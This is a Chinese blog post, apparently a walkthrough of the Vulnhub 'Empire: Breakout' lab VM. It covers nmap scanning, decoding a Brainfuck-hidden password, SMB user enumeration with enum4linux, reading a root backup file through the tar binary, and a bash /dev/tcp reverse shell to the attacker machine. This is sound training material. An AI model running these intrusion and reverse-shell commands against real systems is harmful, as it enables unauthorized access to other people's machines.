@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Vulnhub靶机渗透之权限提取，SMB泄露问题-靶场Breakout | Carrotの小窝</title><meta name="author" content="Carrot"><meta name="copyright" content="Carrot"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学习前言vulnhub是个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。 Vulnhub 官网：Vulnerable By Design ~ VulnHub 今天用到的靶场Breakout：Empire: Breakout ~ VulnHub 准备工作环境：Linux kali Breakout靶机 浏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub靶机渗透之权限提取，SMB泄露问题-靶场Breakout">
+<meta property="og:url" content="https://carrotst.github.io/2023/09/13/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8F%96%EF%BC%8CSMB%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98-%E9%9D%B6%E5%9C%BABreakout/index.html">
+<meta property="og:site_name" content="Carrotの小窝">
+<meta property="og:description" content="学习前言vulnhub是个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。 Vulnhub 官网：Vulnerable By Design ~ VulnHub 今天用到的靶场Breakout：Empire: Breakout ~ VulnHub 准备工作环境：Linux kali Breakout靶机 浏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cci1.dimtown.com/uploads/2022/09/20220922111944744.jpg">
+<meta property="article:published_time" content="2023-09-13T14:18:06.000Z">
+<meta property="article:modified_time" content="2023-09-14T17:23:03.060Z">
+<meta property="article:author" content="Carrot">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="靶场练习">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cci1.dimtown.com/uploads/2022/09/20220922111944744.jpg"><link rel="shortcut icon" href="https://img1.imgtp.com/2023/09/15/vEOUnXQI.ico"><link rel="canonical" href="https://carrotst.github.io/2023/09/13/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8F%96%EF%BC%8CSMB%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98-%E9%9D%B6%E5%9C%BABreakout/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulnhub靶机渗透之权限提取，SMB泄露问题-靶场Breakout',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-15 01:23:03'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/transpancy.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=582949896&amp;s=640" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cci1.dimtown.com/uploads/2022/09/20220922111944744.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Carrotの小窝"><span class="site-name">Carrotの小窝</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub靶机渗透之权限提取，SMB泄露问题-靶场Breakout</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-13T14:18:06.000Z" title="发表于 2023-09-13 22:18:06">2023-09-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-14T17:23:03.060Z" title="更新于 2023-09-15 01:23:03">2023-09-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E6%B8%97%E9%80%8F/">Web渗透</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E6%B8%97%E9%80%8F/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub靶机渗透之权限提取，SMB泄露问题-靶场Breakout"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="学习前言"><a href="#学习前言" class="headerlink" title="学习前言"></a>学习前言</h1><p>vulnhub是个提供各种漏洞平台的综合靶场，可供下载多种虚拟机进行下载，本地VM打开即可，像做游戏一样去完成渗透测试、提权、漏洞利用、代码审计等等有趣的实战。</p>
+<p>Vulnhub 官网：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/">Vulnerable By Design ~ VulnHub</a></p>
+<p>今天用到的靶场Breakout：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/empire-breakout,751/">Empire: Breakout ~ VulnHub</a></p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>环境：Linux kali Breakout靶机 浏览器</p>
+<p>知识点：Linux基础</p>
+<h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><p>我们拿到靶机后打开直接看到IP地址了</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/21hDFBXO.png"></p>
+<p>但是如果在真实的环境当中进行内网渗透，我们看不到目标主机怎么办呢</p>
+<p>我们知道，内网一般存在于一个网段或者不同网段，可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap -sn 192.168.159.0/24 #扫描整个网段里的所有IP地址</span><br></pre></td></tr></table></figure>
+
+<p>这里我们直接知道IP为：192.168.159.134</p>
+<h4 id="第一步：开始收集它开放的端口"><a href="#第一步：开始收集它开放的端口" class="headerlink" title="第一步：开始收集它开放的端口"></a>第一步：开始收集它开放的端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nmap -sV 192.168.159.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/09/13/RCvVcQN8.png"></p>
+<p>可以看到开放的端口是很多的有:<code>80 139 445 10000 20000 </code></p>
+<p>首先我们先访问一下 <code>80 端口</code>有啥东西</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/w6tu9LXo.png"></p>
+<p> 发现了个Apache的页面，说明了它用的中间件是 Apache2</p>
+<p>发现这个有啥用呢，也没发现什么敏感的信息，正当我准备关闭的时候，按下了F12 发现了个不一样的东西</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/91RPOF1q.png"></p>
+<p> 一窜窜东西还提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">don&#x27;t worry no one will get here, it&#x27;s safe to share with you my access. Its encrypted</span><br></pre></td></tr></table></figure>
+
+<p>翻译过来大概是：不要担心，他很安全</p>
+<p>哪它到底安不安全呢?起初我以为是简单的摩尔斯密码，但我一看，有点不像，因为它多了几个符号杂七杂八的东西，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure>
+
+<p>然后我试了各种密码都不对，最后我还是通过csdn的一篇文章，看到了原题，才知道这是ook加密</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/084SaDkI.png"></p>
+<p>最后解密过来就是：<code> .2uqPEfj3D&lt;P&#39;a-3</code></p>
+<p>推荐解密工具：<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/brainfuck">Brainfuck&#x2F;OoK加密解密 - Bugku CTF</a></p>
+<p>这一长串的东西，有点像密码，但我们又不确定，先存着</p>
+<p>然后我们再看看 10000 和 20000 这个端口里面是啥</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/sLBSNXZq.png"></p>
+<p><img src="https://img1.imgtp.com/2023/09/13/s8P3R540.png"></p>
+<p>一个网站是Uermin 一个是 Webmin</p>
+<p>两个网站挺正常的也没啥可以的点。</p>
+<h3 id="二、SMB-泄露"><a href="#二、SMB-泄露" class="headerlink" title="二、SMB 泄露"></a>二、SMB 泄露</h3><p>我们通过端口扫描的时候发现了它开启了<code>SMB服务</code>，文件共享服务</p>
+<p>那么我们是否可以通过一些工具来，扫描这些文件有没有我们想要的内容呢？</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/tX2S0dMu.png"></p>
+<p>我们试试用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 192.168.159.134</span><br></pre></td></tr></table></figure>
+
+<p> Enum4Linux 是很棒的扫描工具，可以扫描发现SMB泄露的文件</p>
+<p>通过扫描我们发现了敏感的东西</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/042Obx2M.png"></p>
+<p> 发现了啥 再\Unix User\ 文件有个用户文件叫做<code>cyber</code></p>
+<p>说明什么，说明了这个可能就是系统的某个账户，那么再结合我们上面的密码，是否可以访问后台了呢，首先刚刚有10000 和 20000 两个网站 一个是web应用的后台 密码应该不能是系统里的用户</p>
+<p>所以我们锁定了Usermin，我们试着登入试试</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/BF1uPfR0.png"></p>
+<p>登入成功，既然是个文件管理系统，那不就好办了，可以知道网站上的所有文件</p>
+<p>我们直接打开终端</p>
+<p> <img src="https://img1.imgtp.com/2023/09/13/WAxzoouL.png"></p>
+<p>通过查看目录，发现了一个<code>user.txt</code>打开它就得到了第一个flag</p>
+<p> <img src="https://img1.imgtp.com/2023/09/13/nDKK4LfU.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[cyber@breakout ~]$ ls</span><br><span class="line">tar</span><br><span class="line">user.txt</span><br><span class="line">[cyber@breakout ~]$ cat user.txt</span><br><span class="line">3mp!r3&#123;You_Manage_To_Break_To_My_Secure_Access&#125;</span><br><span class="line">[cyber@breakout ~]$</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、Linux提权"><a href="#三、Linux提权" class="headerlink" title="三、Linux提权"></a>三、Linux提权</h3><p>在我们打开另一个<code> tar</code>文件的时候发现啥权限不够，查看权限的时候发现只有root用户才能操作，我们用户是 cyber 无权操作 但是这个是可执行文件，说明什么？</p>
+<p>权限如何看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r 表示文件可以被读（read）</span><br><span class="line"></span><br><span class="line">w 表示文件可以被写（write）</span><br><span class="line"></span><br><span class="line">x 表示文件可以被执行（如果它是程序的话）</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/09/13/YU2H5CQw.png"></p>
+<p> 那么我们如何提权呢？如何拿到<code>root</code>权限呢？<br>我们找到网站目录文件看看有啥好东西</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/dX7ijPV5.png"></p>
+<p> 敏感文件 <code>backups</code> 备份文件，进去看看</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/NJrhCpp0.png"></p>
+<p> 还是没发现什么有用的文件，那是不是隐藏了？</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img1.imgtp.com/2023/09/13/Okceg2CQ.png"></p>
+<p>果然有个 <code>old_pass.bak</code></p>
+<p> 我们只有读取的权限，那么我们通过打包再解压的方式</p>
+<p>一定要cd ~ 不然会没有权限访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/tar -cvf oldpass.tar /</span>var<span class="regexp">/backups/</span>.old_pass.bak</span><br><span class="line">tar -xvf oldpass.tar</span><br></pre></td></tr></table></figure>
+
+<p>最后</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/PiFdT4Gs.png"></p>
+<p>得到密码了</p>
+<p>后面发现直接 su 的话是不能直接登入的</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/LQjAbhm6.png"></p>
+<p>所以就用到强大的kali  用 NC做个反弹shell</p>
+<p>nc -lvvp 999</p>
+<p> 靶机上输入：里面是kali的IP、 999 是监听的端口</p>
+<p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.159.128&#x2F;999 0&gt;&amp;1<br>最后就得到flag了</p>
+<p><img src="https://img1.imgtp.com/2023/09/13/hqXm4wXY.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Vulnhub的这个靶场非常适合新手的朋友，里面包含了 信息收集，密码解密，SMB共享文件泄露</p>
+<p>备份文件泄露，通过泄露的密码进行Linux提权。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://carrotst.github.io">Carrot</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://carrotst.github.io/2023/09/13/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8F%96%EF%BC%8CSMB%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98-%E9%9D%B6%E5%9C%BABreakout/">https://carrotst.github.io/2023/09/13/Vulnhub%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8F%96%EF%BC%8CSMB%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98-%E9%9D%B6%E5%9C%BABreakout/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://carrotst.github.io" target="_blank">Carrotの小窝</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a></div><div class="post_share"><div class="social-share" data-image="https://cci1.dimtown.com/uploads/2022/09/20220922111944744.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/14/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AC%94%E8%AE%B0-%E7%AC%AC%E4%B8%80%E7%AB%A0/" title="Mysql数据库速通笔记1"><img class="cover" src="https://img1.imgtp.com/2023/09/15/pGsccNVu.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Mysql数据库速通笔记1</div></div></a></div><div class="next-post pull-right"><a href="/2023/09/13/%E4%BB%80%E4%B9%88%E6%98%AFSSTI%EF%BC%9F/" title="什么是SSTI？"><img class="cover" src="https://img1.imgtp.com/2023/09/15/zHwH5zQx.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">什么是SSTI？</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/09/13/XSS%E5%90%84%E7%A7%8D%E8%BF%87%E6%BB%A4%E6%89%8B%E6%AE%B5%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87%E5%86%99payload/" title="XSS各种过滤手段，如何绕过写payload"><img class="cover" src="https://cci1.dimtown.com/uploads/2022/05/20220526183732136.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-13</div><div class="title">XSS各种过滤手段，如何绕过写payload</div></div></a></div><div><a href="/2023/09/19/%E3%80%90%E7%AC%AC%E4%B8%80%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/" title="【第一章】常见漏洞OWASP_TOP_10"><img class="cover" src="https://img1.imgtp.com/2023/09/19/2B8QzN8t.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-19</div><div class="title">【第一章】常见漏洞OWASP_TOP_10</div></div></a></div><div><a href="/2023/09/21/%E3%80%90%E7%AC%AC%E4%BA%8C%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/" title="【第二章】常见漏洞OWASP-TOP-10"><img class="cover" src="https://img1.imgtp.com/2023/09/19/2B8QzN8t.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-21</div><div class="title">【第二章】常见漏洞OWASP-TOP-10</div></div></a></div><div><a href="/2023/09/13/%E4%BB%80%E4%B9%88%E6%98%AFSSTI%EF%BC%9F/" title="什么是SSTI？"><img class="cover" src="https://img1.imgtp.com/2023/09/15/zHwH5zQx.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-13</div><div class="title">什么是SSTI？</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=582949896&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Carrot</div><div class="author-info__description">猪也爱吃萝卜！<br>一个玩网安又很菜的萝卜</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/"><i class="fab fa-github"></i><span>前往github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/ZhangAweio" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=582949896&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:582949896@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客，持续更新中...QQ交流群:611149449</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">学习前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.1.</span> <span class="toc-text">准备工作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">一、信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E5%BC%80%E5%A7%8B%E6%94%B6%E9%9B%86%E5%AE%83%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">第一步：开始收集它开放的端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SMB-%E6%B3%84%E9%9C%B2"><span class="toc-number">1.1.2.</span> <span class="toc-text">二、SMB 泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81Linux%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.3.</span> <span class="toc-text">三、Linux提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/09/21/%E3%80%90%E7%AC%AC%E4%BA%8C%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/" title="【第二章】常见漏洞OWASP-TOP-10"><img src="https://img1.imgtp.com/2023/09/19/2B8QzN8t.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【第二章】常见漏洞OWASP-TOP-10"/></a><div class="content"><a class="title" href="/2023/09/21/%E3%80%90%E7%AC%AC%E4%BA%8C%E7%AB%A0%E3%80%91%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9EOWASP-TOP-10/" title="【第二章】常见漏洞OWASP-TOP-10">【第二章】常见漏洞OWASP-TOP-10</a><time datetime="2023-09-21T13:41:49.000Z" title="发表于 2023-09-21 21:41:49">2023-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" 